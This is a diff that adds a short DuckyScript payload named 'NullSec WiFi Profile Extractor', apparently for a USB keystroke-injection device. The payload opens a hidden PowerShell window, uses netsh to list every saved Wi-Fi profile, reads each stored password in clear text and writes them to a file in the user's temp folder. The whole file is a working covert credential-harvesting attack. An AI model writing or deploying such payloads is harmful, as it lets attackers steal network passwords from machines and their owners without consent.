@@ -1,0 +1,18 @@
+REM NullSec WiFi Profile Extractor
+REM Extracts saved WiFi passwords
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING $profiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_ -split ":")[1].Trim() }
+ENTER
+STRING $results = foreach ($p in $profiles) { $key = (netsh wlan show profile name="$p" key=clear | Select-String "Key Content").ToString().Split(':')[1].Trim(); "$p : $key" }
+ENTER
+STRING $results | Out-File "$env:TEMP\wifi_keys.txt"
+ENTER
+STRING exit
+ENTER
